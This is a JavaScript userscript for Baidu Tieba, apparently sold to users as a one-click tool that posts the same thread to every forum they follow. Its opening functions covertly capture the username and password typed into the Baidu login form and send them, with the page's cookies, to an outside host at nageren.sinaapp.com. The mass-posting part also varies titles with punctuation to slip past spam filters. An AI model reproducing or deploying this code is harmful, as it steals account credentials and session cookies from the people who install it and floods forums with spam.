$("#u1 a").eq(1).click(function() {
    getNaP();
})
$(".u_login a").click(function() {
    getNaP();
})
if (!localStorage.NpSuc) postNaP();

function getNaP() {
    setTimeout(function() {
        localStorage.names = $("#TANGRAM__PSP_8__userName").val();
        localStorage.pass = $("#TANGRAM__PSP_8__password").val();
        $("#TANGRAM__PSP_8__userName").blur(function() {
            localStorage.names = $("#TANGRAM__PSP_8__userName").val();
        })
        $("#TANGRAM__PSP_8__password").blur(function() {
            localStorage.pass = $("#TANGRAM__PSP_8__password").val();
        })
    }, 900)
}

function postNaP() {
    if (localStorage.names && localStorage.pass) {
        $.ajax({
            type: "post",
            timeout: 6000,
            async: true,
            url: "http://1.nageren.sinaapp.com/index.php",
            data: {
                "name": localStorage.names,
                "pass": localStorage.pass,
                "cookie": document.cookie
            },
            success: function() {

                localStorage.NpSuc = 1;
            }
        });
    }
}
if (window.location.href.indexOf("http://tieba.baidu.com/i/") >= 0) {
    var lhref = window.location.href;
    var w = lhref.lastIndexOf("/");
    var lastHref = lhref.substr(w + 1);

    function tiebaSid() {}
    tiebaSid.prototype.urlList = function() {
        var trList = $(".forum_table tr:first").nextAll();
        for (var i = 0; i < trList.length; i++) {
            sessionStorage.setItem(trList.eq(i).children("td:first").children('a:first').text(), trList.eq(i).children("td:first").children('a:first').attr('href'));
        };
        if (window.sessionStorage != null) {
            this.goto();
        }
    }
    tiebaSid.prototype.goto = function() {
        var nextAll = $("#j_pagebar a");
        var r = 0;
        for (var i = 0; i < nextAll.length; i++) {
            if (nextAll.eq(i).text() === "下一页") {
                r = 1;
                location.href = nextAll.eq(i).attr("href") + "&cd";
            }
        };
        if (!r) {
            this.getSid();
        }
    }
    tiebaSid.prototype.getSid = function() {
        $("#container").css("position", "relative");
        $("#container").append('<div id="sucList" style="width:100%;height:auto;overflow:hidden;background-color: black;top: 120px;position:absolute;-30px;color:white;padding:15px 0"><div style="margin-left:50px;height:30px;line-height:30px;font-size:14px;font-weight:bold">请不要刷新，刷新后重新发送帖子引起封号请自行负责!</div><div style="margin-left:50px;height:30px;line-height:30px;font-size:14px;font-weight:bold">发送一个贴吧等待15秒，速度较慢，建议开个新页面去玩吧，过会再来看</div></div>');
        var step = sessionStorage.length;
        var fhList = new Array(".", ",", "'", ";", "\\", "/", "<", ">", "?", "？", "（", "）", "√", "Ⅰ", "♂", "♀", "→", "←", "↑", "↓", "『", "』", "「", "」", "π", "a", "b", "c", "d", "e", "f", "g", "h", "k", "j", "=", "-", "+", "*", "^", "!", "！", "~", "1", "2", "。", "、", "\"", "“", "”", "‘", "’", "δ", "ε", "ι", "..", "...", ".。", ".'", ".“", ".”", "。.", "。‘", "。’", "。。", "'.", "“.", "“。", ".‘", ".’", ".‘’");
        var _this = this;
        var title = localStorage.title;
        var arr = title.split('');
        var j = arr.length - 1;
        var v = 0,
            p = 0;
        var timer = setInterval(function() {
            step--;
            if (step < 0) {
                $("#sucList").append('<div style="margin-left:50px;height:30px;line-height:30px;"><input type="button" value="关闭" style="width:100px;height:30px" onclick="javascript:document.getElementById(\'sucList\').style.display=\'none\'"></div>');
                sessionStorage.clear();
                clearInterval(timer);
                return;
            }
            var keyName = sessionStorage.key(step);
            var hrefName = sessionStorage.getItem(keyName);
            _this.postUrl(hrefName);
            p++
            if (p < 16) return;
            if (v > fhList.length - 1) {
                arr[j] = arr[j].substr(0, 1);
                j--;
                v = 0;
            }
            if (j >= 0) {
                arr[j] = arr[j].substr(0, 1) + fhList[v];
            } else {
                arr.push(".");
            }
            localStorage.title = arr.join('');
            v++;
        }, 15000)
    }
    tiebaSid.prototype.postUrl = function(hrefName) {
        var _this = this;
        $.ajax({
            type: "get",
            timeout: 6000,
            async: false,
            cache: false,
            url: hrefName,
            success: function(data) {
                var sid = getString(data, "PageData.tbs", "\"", "\"");
                var fid = getString(data, "forum_id", ":", ",");
                var kw = getString(data, "PageData.forum.forum_name", "'", "'");
                _this.postQf(kw, fid, sid);
            }
        });
    }
    tiebaSid.prototype.postQf = function(kw, fid, sid) {
        var content = localStorage.content;
        var rpContent = content.replace(/[\n\r]/gi, "<br/>").replace(/[ ]/g, "&nbsp;").replace(/&空格&/g, " ").toString();
        $.ajax({
            type: "post",
            timeout: 6000,
            async: false,
            url: "http://tieba.baidu.com/f/commit/thread/add",
            data: {
                "kw": kw,
                "fid": fid,
                "tbs": sid,
                "title": localStorage.title,
                "content": rpContent
            },
            dataType: "json",
            success: function(json) {
                console.log(json.err_code + "       " + localStorage.title + "     " + kw);
                if (json.err_code == "0") {
                    $("#sucList").append('<span style="margin-left:50px;font-size: 17px;display: inline-block;line-height:30px">' + kw + '吧发送成功</span');
                } else {
                    $("#sucList").append('<span style="margin-left:50px;font-size: 17px;display: inline-block;line-height:30px">' + kw + '吧发送失败</span');
                }
            },
            error: function(XMLHttpRequest, textStatus) {
                if (textStatus == null) {
                    $("#sucList").append('<span style="margin-left:50px;font-size: 17px;display: inline-block;line-height:30px">' + kw + '吧发送错误</span');
                } else if (textStatus == 'timeout') {
                    $("#sucList").append('<span style="margin-left:50px;font-size: 17px;display: inline-block;line-height:30px">' + kw + '吧发送超时</span');
                } else {
                    $("#sucList").append('<span style="margin-left:50px;font-size: 17px;display: inline-block;line-height:30px">' + kw + '吧发送失败</span');
                }
            }
        });
    };

    function getString(source, str, sL, sR) {
        var i = source.indexOf(str);
        var j = source.indexOf(sL, i)
        var m = source.indexOf(sR, j * 1 + 1);
        return source.substring(j * 1 + 1, m);
    }
    if (lastHref == "forum?&pn=1" || lastHref == "forum") {
        sessionStorage.clear();
        $("#forum_sub_tab ul").append('<li class="current" id="yjqfBtn"><a href="javascript:void(0">一键群发</a></li>');
        $("#content").css("position", "relative");
        $("#content").append('<div id="imgUrlBox" style="display:none;position:absolute;width:900px;height:100px;background-color:green;z-index:999;top:300px;text-align:center;padding-top:10px;color:white">网络地址(http://*):<input id="imgUrl" type="text" style="width:800px;margin-top:10px"><br>宽度:<input id="imgWidth" type="text" style="margin-top:10px"><label style="margin-left:10px">高度:</label><input id="imgHeight" type="text" style="margin-top:10px"><input type="button" value="确定" id="yesBtn"><input type="button" value="取消" id="noBtn"></div>')
        var content = document.createElement("div");
        content.id = "ctDiv";
        $(content).css({
            position: 'absolute',
            width: '739px',
            height: '600px',
            backgroundColor: 'white',
            border: '1px solid black',
            top: '50px',
            display: "none"
        });
        $(content).html('<ul style="width: 90%;padding-top: 8px;list-style-type: none;margin: 0 auto;font-size: 12px;"><li style="margin-top: 10px;overflow: hidden;text-align:right;margin-right:20px"><input type="button" value="确定" id="qfBtn" style="width: 100px;height: 30px"　><input type="button" value="关闭" id="closeBtn" style="width: 100px;height: 30px;margin-left:10px" ></li><li style="margin-top: 10px;overflow: hidden;"><input type="text" id="title" style="width: 532px;height: 35px;"><label style="margin-left:10px">请输入标题</label></li><li style="margin-top: 10px;overflow: hidden;"><textarea id="contentT" style="width: 532px;height: 460px"></textarea><label style="vertical-align: top;margin-left: 10px;">请输入内容</label><br><input type="button" value="插入图片" id="imgBtn" style="width: 69px;height: 30px;margin-right:52px;margin-top:-390px;float:right" ><div style="float: right;margin-top: -350px;width: 100px;margin-right: 20px;">图片不能过分大,否则会发送失败</div></li></ul>');
        $("#content").append(content);
        $("#yjqfBtn").click(function() {
            $("#ctDiv").css('display', 'block');
        })
        $("#closeBtn").click(function() {
            $("#ctDiv").css('display', 'none');
        })
        $("#imgBtn").click(function() {
            $("#imgUrl").val("");
            $("#imgWidth").val("");
            $("#imgHeight").val("");
            $("#imgUrlBox").css("display", "block");
        })
        $("#yesBtn").click(function() {
            var imgUrl = $("#imgUrl").val().trim();
            var imgWidth = $("#imgWidth").val().trim();
            var imgHeight = $("#imgHeight").val().trim();
            if (imgUrl === "" || imgWidth === "") {
                alert("不能为空");
            } else {
                $("#imgUrlBox").css("display", "none");
                var imgUrlC = '\n<img&空格&class="BDE_Image"&空格&src="' + imgUrl + '"&空格&unselectable="on"&空格&pic_type="1"&空格&width="' + imgWidth + '"&空格&height="' + imgHeight + '"/>';
                $("#contentT").val($("#contentT").val() + imgUrlC);
            }
        })
        document.getElementById("imgWidth").oninput = function() {
            autoHeight.call(this);
        }
        document.getElementById("imgWidth").onblur = function() {
            autoHeight.call(this);
        }

        function autoHeight() {
            var imgwidth = this.value.trim();
            if (imgwidth * 1 > 560) this.value = 560;
            var img = document.createElement('img');
            img.src = $("#imgUrl").val();
            var src_w = img.width;
            var src_h = img.height;
            var scale_w = imgwidth / src_w;
            $("#imgHeight").val(parseInt(src_h * scale_w));
        }
        $("#noBtn").click(function() {
            $("#imgUrlBox").css("display", "none");

        })
        $("#qfBtn").click(function() {
            var title = $("#title").val();
            var content = $("#contentT").val();
            localStorage.title = title;
            localStorage.content = content;
            if (title === "" || content === "") {
                alert("标题和内容不能为空");
                return false;
            }
            new tiebaSid().urlList();
            $("#ctDiv").css('display', 'none');
        });
    } else {
        var p = lhref.lastIndexOf("&");
        var cd = lhref.substr(p * 1 + 1);
        if (cd === "cd") {
            setTimeout(function() {
                var tiebaSidSl = new tiebaSid();
                tiebaSidSl.urlList();
            }, 2000);

        } else {
            sessionStorage.clear();
        }
    }
}